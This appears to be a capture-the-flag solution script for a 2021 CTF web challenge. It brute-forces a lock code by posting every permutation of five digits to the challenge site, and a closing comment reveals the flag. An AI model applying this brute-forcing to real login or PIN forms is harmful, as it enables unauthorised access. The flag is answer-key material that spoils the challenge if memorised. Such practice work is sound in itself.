import requests
import itertools


for x in itertools.permutations("35780"):
    x = ''.join(x)
    r = requests.post('https://old-lock-web.2021.ctfcompetition.com/', data={"v":x})
    if "CTF" in r.text:
        print (r.text)

# CTF{IThinkWeNeedToReplaceTheKeypad}
